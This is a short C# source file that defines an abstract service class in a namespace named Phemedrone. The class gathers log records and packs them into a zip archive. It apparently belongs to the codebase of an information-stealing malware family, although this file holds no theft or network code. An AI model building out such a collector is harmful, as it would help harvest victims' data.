using System;
using System.Collections.Generic;
using System.IO;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone
{
    public abstract class IService : IDisposable
    {
        public LogRecord[] Entries;
        public abstract PriorityLevel Priority { get; }
        protected abstract LogRecord[] Collect();

        public void Run()
        {
            Entries = this.Collect();
        }

        public static void AddRecords(IEnumerable<LogRecord> records, ZipStorage storage)
        {
            foreach (var record in records)
            {
                storage.AddStream(ZipStorage.Compression.Store,
                    record.Path,
                    new MemoryStream(record.Content),
                    DateTime.Now);
            }
        }
        
        // idk if it's gonna work but whatever
        // garbage collector should optimize application memory
        public void Dispose()
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
        }
    }
}